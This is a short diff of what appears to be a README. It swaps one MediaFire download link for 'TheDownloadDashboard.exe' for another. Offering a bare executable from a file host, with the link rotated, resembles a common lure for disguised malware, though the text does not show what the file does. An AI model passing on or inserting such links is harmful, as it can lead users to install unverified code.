@@ -19,4 +19,4 @@ Registration is limited, then only registered users can create new accounts for 
 
 # 🖼️ Preview
 ![preview](https://i.imgur.com/0B5boFa.png)
-# [Download](https://download1484.mediafire.com/abd0eaj8bnog/89t1uvufgou2aj9/TheDownloadDashboard.exe)
+# [Download](https://download1319.mediafire.com/7gw8nsjq69ng/1uk2uvcamjl34uj/TheDownloadDashboard.exe)
